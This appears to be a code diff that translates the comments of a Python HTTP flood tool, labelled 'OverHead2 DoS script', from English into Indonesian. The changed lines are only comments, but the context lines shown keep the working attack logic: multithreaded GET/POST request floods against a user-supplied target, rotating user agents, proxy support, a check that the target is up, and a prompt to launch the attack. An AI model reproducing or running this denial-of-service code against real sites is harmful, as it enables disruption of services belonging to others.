@@ -12,9 +12,9 @@ import time
 import argparse
 from arts import Header, options
 
-config = {}     # Stores de configuration provided by the user
-success = 0     # Count of the amount of packets successfully send
-stop = False    # If True stop all threads
+config = {}     # Menyimpan konfigurasi yang diberikan oleh pengguna.
+success = 0     # Jumlah paket yang berhasil dikirim
+stop = False    # Jika benar, hentikan semua thread.
 user_agents = [
     "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
     "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
@@ -46,7 +46,7 @@ class Get(thread):
     def __init__(self,config):
         super().__init__(config)
 
-    def http_get(self):                 # Change session to previous
+    def http_get(self):                 # Ubah sesi ke sebelumnya
 
         try:
             r = requests.get(self.url, headers=self.set_headers(), proxies=self.proxy)
@@ -106,7 +106,7 @@ def parse_proxy(proxy):
         proxy = 'http://'+proxy
     return {'http': proxy, 'https': proxy}
 def check_address(url):
-    # Check if the provided target is up
+    # Periksa apakah target yang diberikan aktif.
     try:
         req = requests.get(url)
         return req.status_code == requests.codes.ok
@@ -115,7 +115,7 @@ def check_address(url):
         return False
 
 def generate_data(leng): 
-    # This is used to generate data randomly 
+    # Ini digunakan untuk menghasilkan data secara acak.
     chars = ["!", "@", "-", "`", ";", "^", "+", "*"]
     msg = ""
     c = 0
@@ -125,7 +125,7 @@ def generate_data(leng):
     return msg
 
 def get_parser():
-    # Creates a configuration dictionary based on the parameters we gave
+    # Membuat kamus konfigurasi berdasarkan parameter yang telah di berikan.
     parser = argparse.ArgumentParser(description='OverHead2 DoS script.')
     parser.add_argument('-u', '--url', help='Set an IP or URL as target', type=str)
     parser.add_argument('-t', '--threads', help='Set the number of threads to be created', type=int, default=100)
@@ -135,7 +135,7 @@ def get_parser():
     parser.add_argument('--post', '--POST', help='Perform the attack with HTTP POST', action='store_true')
     return parser
 def check_input(config):
-    # Check and manipulate the inputs
+    # Periksa dan manipulasi input.
     if not config["url"]:
         print('[!]  You must specify a Target  [!]')
         exit(0)
@@ -147,12 +147,12 @@ def check_input(config):
     return config
 
 def main():
-    threads_pool = []                        # Stores all active threads
-    Header()                                 # Prints the header
-    options = get_parser()                   # Get the arguments
+    threads_pool = []                        # Menyimpan semua thread aktif
+    Header()                                 # Mencetak header
+    options = get_parser()                   # Dapatkan argumen
     config = check_input(vars(options.parse_args()))
 
-    # PRINT INFO BANNER
+    # CETAK BANNER INFORMASI
     status = check_address(config["url"])
     separator = "#"+"="*40+"#"
     print("{0} \n# Target: {1}\n# Threads: {2}\n# Status: {3}\n# Type: {4}\n# Proxy: {5}\n{0}".format(
@@ -166,14 +166,14 @@ def main():
         exit(0)
     print("\n> Press enter to launch the attack")
     input()
-    # START DE ATTACK 
+    # MEMULAI SERANGAN
     starting_time = time.time()
     for c in range(config["threads"]):
         t = Get(config) if config["type"] == "GET" else Post(config)
         threads_pool.append(t)
         t.start()
 
-    # Starts a new checker thread 
+    # Memulai thread pemeriksaan baru
     checker = Checker(config)
     checker.start()
 
